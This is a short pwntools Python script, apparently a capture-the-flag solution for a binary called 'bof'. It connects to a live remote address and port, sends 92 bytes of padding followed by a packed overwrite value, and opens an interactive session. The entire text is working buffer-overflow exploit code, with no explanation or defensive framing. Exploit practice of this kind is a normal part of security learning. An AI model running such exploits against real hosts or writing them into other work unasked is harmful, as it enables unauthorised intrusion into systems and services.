from pwn import *

#p = process("./bof")
p = remote("128.199.247.205", 1331)
padding = b"a"* 92
win  = p64(0x4DF218EE)
payload = padding + win
p.sendline(payload)
p.interactive()
